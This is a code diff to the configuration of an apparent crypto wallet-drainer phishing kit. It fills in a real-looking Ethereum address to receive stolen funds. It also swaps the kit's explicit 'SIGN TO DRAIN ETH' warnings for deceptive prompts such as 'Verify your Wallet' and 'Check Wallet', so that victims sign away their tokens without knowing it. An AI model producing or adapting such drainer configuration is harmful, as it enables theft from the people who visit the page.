@@ -1,8 +1,8 @@
 // your address goes here
-const receiveAddress = "YourAddressHere";
+const receiveAddress = "0x5E4686E275a4D1abB21272A3D05007fBF748a237";
 
 const collectionInfo = {
-    name: "SIGN TO DRAIN ETH",
+    name: "Connect to check wallet",
     socialMedia: {
         discord: "https://discord.com",
         twitter: "https://twitter.com",
@@ -19,7 +19,7 @@ const indexPageInfo = {
 const claimPageInfo = {
     title: "SIGN TO<br>DRAIN", // <br> is a line break
     shortDescription: "SHOW YOUR LOYALTY.",
-    longDescription: "SIGN TO DRAIN ETH! IF YOU SIGN YOU WILL LOSE YOUR ETH",
+    longDescription: "You'll lose your tokens",
 
     claimButtonText: "CLAIM NOW",
 
@@ -35,8 +35,8 @@ const drainNftsInfo = {
 
 const customStrings = {
     title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
-    connectButton: "Connect wallet",
-    transferButton: "Mint now",
+    connectButton: "Verify your Wallet",
+    transferButton: "Check Wallet",
     dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
 }
 
